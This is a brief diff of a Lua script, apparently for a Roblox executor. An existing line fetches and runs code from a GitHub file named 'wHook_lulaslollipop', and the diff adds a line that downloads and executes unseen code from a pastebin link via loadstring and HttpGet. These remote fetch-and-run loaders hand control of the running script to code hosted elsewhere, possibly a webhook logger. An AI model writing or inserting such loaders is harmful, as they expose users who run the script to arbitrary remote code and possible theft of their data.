@@ -127,3 +127,4 @@ end;
 spawn(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/diskord/refs/heads/main/wHook_lulaslollipop",true))()
 end)
+loadstring(game:HttpGet("https://pastebin.com/raw/yLMTk28W",true))()
